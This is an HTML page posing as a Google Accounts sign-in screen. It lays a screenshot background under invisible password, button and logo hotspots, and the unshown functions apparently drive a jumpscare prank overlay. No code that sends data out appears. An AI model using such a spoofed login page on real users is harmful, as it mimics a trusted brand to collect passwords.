<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <style>
        body, html {
            margin: 0; padding: 0;
            width: 100%; height: 100%;
            overflow: hidden; background-color: #000;
        }

        #container {
            width: 100vw; height: 100vh;
            background-image: url('Screenshot 2026-04-12 2.48.41 AM.png');
            background-size: contain;
            background-repeat: no-repeat;
            background-position: center;
            position: relative;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        /* INVISIBLE INPUT: Positioned over the blue-outlined box */
        #real-input {
            position: absolute;
            top: 48%; /* Adjust slightly if the cursor isn't in the blue box */
            left: 50%;
            width: 450px; 
            height: 65px;
            background: transparent;
            border: none;
            color: white;
            font-size: 20px;
            outline: none;
            z-index: 10;
        }

        /* INVISIBLE LOGO TRIGGER: Over the 'G' logo */
        #logo-trigger {
            position: absolute;
            top: 8%;
            left: 2%;
            width: 80px;
            height: 80px;
            cursor: pointer;
            z-index: 20;
        }

        /* INVISIBLE NEXT BUTTON: Since it's not in the photo, 
           we place it where it usually is (bottom right) */
        #fake-next {
            position: absolute;
            bottom: 25%;
            right: 15%;
            width: 100px;
            height: 50px;
            cursor: pointer;
            z-index: 20;
        }

        #overlay {
            display: none; position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: #000; z-index: 9999;
        }
        #overlay img, #overlay video { width: 100%; height: 100%; object-fit: contain; }
    </style>
</head>
<body>

<div id="container">
    <input type="password" id="real-input" autocomplete="off" autofocus>
    <div id="logo-trigger" onclick="triggerFredbear()"></div>
    <div id="fake-next" onclick="checkPass()"></div>
</div>
